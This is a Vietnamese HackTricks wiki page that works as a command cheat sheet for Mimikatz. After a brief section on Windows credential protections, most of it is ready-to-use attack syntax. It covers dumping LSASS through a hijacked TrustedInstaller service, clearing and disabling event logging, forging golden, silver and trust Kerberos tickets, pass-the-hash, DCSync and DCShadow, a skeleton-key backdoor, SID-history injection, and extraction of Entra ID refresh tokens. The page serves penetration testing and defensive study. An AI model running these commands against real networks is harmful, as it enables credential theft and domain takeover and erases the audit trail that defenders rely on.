# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Trang này dựa trên một trang của [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Hãy xem bản gốc để biết thêm thông tin!<sup>[[3]](#references)</sup>

## LM và Clear-Text trong bộ nhớ

Từ Windows 8.1 và Windows Server 2012 R2 trở đi, nhiều biện pháp quan trọng đã được triển khai để bảo vệ khỏi hành vi đánh cắp thông tin xác thực:

- **LM hashes và mật khẩu dạng plain-text** không còn được lưu trong bộ nhớ nhằm tăng cường bảo mật. Cần cấu hình một thiết lập registry cụ thể, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, với giá trị DWORD là `0` để tắt Digest Authentication, đảm bảo mật khẩu "clear-text" không được cache trong LSASS.

- **LSA Protection** được giới thiệu để bảo vệ tiến trình Local Security Authority (LSA) khỏi việc đọc bộ nhớ và chèn code trái phép. Cách thực hiện là đánh dấu LSASS là một tiến trình được bảo vệ. Để kích hoạt LSA Protection:
  1. Sửa registry tại _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ bằng cách đặt `RunAsPPL` thành `dword:00000001`.
  2. Triển khai Group Policy Object (GPO) để áp dụng thay đổi registry này trên các thiết bị được quản lý.

Dù có những biện pháp bảo vệ này, các công cụ như Mimikatz vẫn có thể vượt qua LSA Protection bằng cách sử dụng các driver cụ thể, mặc dù những hành động này có thể được ghi lại trong event logs.

Trên các workstation hiện đại, điều này càng quan trọng hơn vì **Credential Guard được bật mặc định trên nhiều hệ thống Windows 11 22H2+ và Windows Server 2025 đã join domain, không phải DC**, trong khi **LSASS-as-PPL được bật mặc định trên các bản cài mới Windows 11 22H2+**. Trên thực tế, `sekurlsa::logonpasswords` thường thu được ít thông tin hơn so với kỳ vọng từ các tradecraft cũ, và operator ngày càng chuyển sang **offline minidumps**, **trích xuất Kerberos key (`sekurlsa::ekeys`)** hoặc **các module hướng đến CloudAP/PRT**. Để tìm hiểu về phía bảo vệ, hãy xem [Windows credentials protections](credentials-protections.md).

### Ứng phó với việc gỡ bỏ SeDebugPrivilege

Quản trị viên thường có SeDebugPrivilege, cho phép họ debug các chương trình. Có thể hạn chế đặc quyền này để ngăn việc tạo memory dump trái phép, một kỹ thuật phổ biến mà attacker dùng để trích xuất thông tin xác thực từ bộ nhớ. Tuy nhiên, ngay cả khi đặc quyền này bị gỡ bỏ, tài khoản TrustedInstaller vẫn có thể tạo memory dump bằng cách sử dụng cấu hình service được tùy chỉnh:

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

Điều này cho phép dump bộ nhớ của `lsass.exe` vào một tệp, sau đó có thể phân tích tệp đó trên một hệ thống khác để trích xuất thông tin xác thực:

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Tùy chọn Mimikatz

Can thiệp nhật ký sự kiện bằng Mimikatz gồm hai hành động chính: xóa nhật ký sự kiện và vá dịch vụ Event để ngăn ghi nhật ký các sự kiện mới. Dưới đây là các lệnh thực hiện những hành động này:

#### Xóa nhật ký sự kiện

Mimikatz có lệnh `event::clear`. Lệnh này gọi API xóa nhật ký sự kiện của Windows cho nhật ký classic được chọn. Mặc định là `Security`; `/log:` dùng để chọn nhật ký khác, và người gọi cần có quyền xóa nhật ký đó. Lệnh này khác với `event::drop`, vốn cố gắng ngăn ghi các bản ghi mới.<sup>[[4]](#references)</sup>

```bash
mimikatz "event::clear /log:Security" exit
```

#### Tính năng thử nghiệm: Vá Event Service

- **Lệnh**: `event::drop`
- Lệnh thử nghiệm này được thiết kế để thay đổi hành vi của Event Logging Service, qua đó ngăn dịch vụ ghi lại các sự kiện mới.
- Ví dụ: `mimikatz "privilege::debug" "event::drop" exit`

- Lệnh `privilege::debug` đảm bảo Mimikatz có đủ quyền cần thiết để sửa đổi các dịch vụ hệ thống.
- Lệnh `event::drop` sau đó vá Event Logging Service.

### Tấn công vé Kerberos

Dùng các lệnh bên dưới để tham khảo nhanh cú pháp. Các trang chuyên biệt về [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) và [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) có thông tin cập nhật về các điểm cần lưu ý liên quan đến AES/PAC/opsec.

### Tạo Golden Ticket

Golden Ticket cho phép giả mạo quyền truy cập trên toàn domain. Lệnh và các tham số chính:

- Lệnh: `kerberos::golden`
- Tham số:
  - `/domain`: Tên domain.
  - `/sid`: Security Identifier (SID) của domain.
  - `/user`: Tên người dùng cần giả mạo.
  - `/krbtgt`: NTLM hash của tài khoản dịch vụ KDC trong domain.
  - `/ptt`: Trực tiếp inject vé vào bộ nhớ.
  - `/ticket`: Lưu vé để sử dụng sau.

Ví dụ:

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Tạo Silver Ticket

Silver Ticket cấp quyền truy cập vào các dịch vụ cụ thể. Lệnh và tham số chính:

- Lệnh: Tương tự Golden Ticket nhưng nhắm đến các dịch vụ cụ thể.
- Tham số:
  - `/service`: Dịch vụ cần nhắm đến (ví dụ: cifs, http).
  - Các tham số khác tương tự Golden Ticket.

Ví dụ:

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Tạo Trust Ticket

Trust Ticket được dùng để truy cập tài nguyên giữa các domain bằng cách tận dụng các mối quan hệ trust. Các lệnh và tham số chính:

- Command: Tương tự Golden Ticket nhưng dành cho các mối quan hệ trust.
- Parameters:
  - `/target`: FQDN của domain đích.
  - `/rc4`: NTLM hash của tài khoản trust.

Ví dụ:

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### Các lệnh Kerberos bổ sung

- **Liệt kê vé**:

  - Lệnh: `kerberos::list`
  - Liệt kê tất cả vé Kerberos của phiên người dùng hiện tại.

- **Pass the Cache**: `kerberos::ptc` đọc tệp MIT/Heimdal `.ccache`, **không phải** tệp `.kirbi`. Truyền đường dẫn tệp dưới dạng đối số vị trí: `mimikatz "kerberos::ptc C:\Temp\user.ccache" exit`.<sup>[[5]](#references)</sup>

- **Pass the Ticket**: `kerberos::ptt` đọc tệp `.kirbi` hoặc một thư mục chứa các tệp như vậy. Lệnh này cũng nhận đường dẫn vị trí, không phải `/ticket:`: `mimikatz "kerberos::ptt C:\Temp\ticket.kirbi" exit`. Xem [Pass the Ticket](../active-directory-methodology/pass-the-ticket.md) để biết quy trình tổng thể.<sup>[[6]](#references)</sup>

- **Xóa vé**:
  - Lệnh: `kerberos::purge`
  - Xóa tất cả vé Kerberos khỏi phiên.
  - Hữu ích trước khi dùng các lệnh thao tác vé để tránh xung đột.

### Over-Pass-the-Hash / Pass-the-Key

Nếu `RC4` bị vô hiệu hóa hoặc hoạt động không ổn định, Mimikatz có thể patch các khóa Kerberos **AES128/AES256** vào phiên đăng nhập hiện tại thay vì chỉ dùng NT hash. Cách này thường phù hợp với các domain hiện đại hơn so với việc xem `sekurlsa::pth` là chỉ dành cho NTLM.<sup>[[1]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```

`/impersonate` sử dụng lại tiến trình hiện tại thay vì tạo console mới, rất hữu ích khi bạn muốn chạy ngay các lệnh như `lsadump::dcsync` trong cùng ngữ cảnh.

### Can thiệp Active Directory

- **DCShadow**: Tạm thời biến một máy thành DC để thao tác với đối tượng AD. Xem [DCShadow](../active-directory-methodology/dcshadow.md).

  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Giả lập DC để yêu cầu dữ liệu mật khẩu. Xem [DCSync](../active-directory-methodology/dcsync.md).
  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Truy cập thông tin xác thực

- **LSADUMP::LSA**: Trích xuất thông tin xác thực từ LSA.

  - `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Mạo danh DC bằng dữ liệu mật khẩu của tài khoản máy tính.

  - _Không có lệnh cụ thể nào được cung cấp cho NetSync trong ngữ cảnh gốc._

- **LSADUMP::SAM**: Truy cập cơ sở dữ liệu SAM cục bộ.

  - `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Giải mã các bí mật được lưu trong registry.

  - `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Đặt NTLM hash mới cho một người dùng.

  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Lấy thông tin xác thực xác thực trust.
  - `mimikatz "lsadump::trust" exit`

### Thông tin xác thực đám mây / Entra ID

Trên các máy chủ **Entra ID** hoặc **hybrid-joined**, `sekurlsa::cloudap` có thể làm lộ dữ liệu **Primary Refresh Token (PRT)** được lưu trong bộ nhớ đệm của LSASS. `ProofOfPossesionKey.KeyValue` là blob session-key được bảo vệ bằng DPAPI, không phải key đã được giải mã.<sup>[[7]](#references)[[8]](#references)</sup> Để dùng `/unprotect`, hãy chạy `dpapi::cloudapkd` dưới quyền `SYSTEM` (ví dụ: dùng `token::elevate` từ phiên Mimikatz đã nâng quyền), hoặc trước tiên nạp key vào bộ nhớ đệm của Mimikatz bằng `sekurlsa::dpapi`. Chỉ `privilege::debug` không làm thay đổi ngữ cảnh caller của DPAPI.<sup>[[8]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEYVALUE> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```

Sao chép `Context` và `Derived Key` **khớp** từ lệnh đầu tiên vào lệnh thứ hai; Mimikatz sẽ tạo context mới nếu không được cung cấp. Ngay cả với key được bảo vệ bằng TPM, Mimikatz vẫn có thể dùng TPM trên thiết bị gốc để dẫn xuất signing key. Không cần xuất clear key, nhưng kết quả derived-key thành công có thể dùng để ký browser cookie.<sup>[[7]](#references)</sup>

Chỉ có chuỗi PRT là chưa đủ vì Microsoft Entra yêu cầu bằng chứng sở hữu session key liên quan.<sup>[[9]](#references)</sup> Xem [khôi phục key DPAPI](../windows-local-privilege-escalation/dpapi-extracting-passwords.md) để biết các tùy chọn master key khác và [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) để xem chuỗi tấn công phía cloud.

### Khác

- **MISC::Skeleton**: Tiêm backdoor vào LSASS trên DC.
  - `mimikatz "privilege::debug" "misc::skeleton" exit`

### Leo thang đặc quyền

- **PRIVILEGE::Backup**: Có quyền backup.

  - `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Có quyền debug.
  - `mimikatz "privilege::debug" exit`

### Dump credential

- **SEKURLSA::LogonPasswords**: Hiển thị credential của người dùng đã đăng nhập.

  - `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Trích xuất ticket Kerberos từ memory.
  - `mimikatz "sekurlsa::tickets /export" exit`

### Thao tác SID và token

- **SID::add/modify**: Thay đổi SID và SIDHistory.

  - Thêm: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  - Sửa đổi: _Không có lệnh cụ thể để sửa đổi trong ngữ cảnh ban đầu._

- **TOKEN::Elevate**: Impersonate token.
  - `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Cho phép nhiều phiên RDP.

  - `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Liệt kê phiên TS/RDP.
  - _Không có lệnh cụ thể cho TS::Sessions trong ngữ cảnh ban đầu._

### Vault

- Trích xuất mật khẩu từ Windows Vault.
  - `mimikatz "vault::cred /patch" exit`




## References

- [1] [Các công cụ của Hacker – module Mimikatz](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB và Entra ID: Làm quen với luồng cache mới](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Tài liệu tham khảo lệnh Mimikatz](https://adsecurity.org/?page_id=1821)
- [4] [Mã nguồn module event của Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_event.c)
- [5] [Mã nguồn module ccache của Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ccache.c)
- [6] [Mã nguồn module Kerberos của Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)
- [7] [Triển khai CloudAP DPAPI của Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_cloudap.c)
- [8] [Tìm hiểu sâu hơn về Primary Refresh Token](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
- [9] [Cơ chế bảo vệ Primary Refresh Token của Microsoft Entra](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
{{#include ../../banners/hacktricks-training.md}}
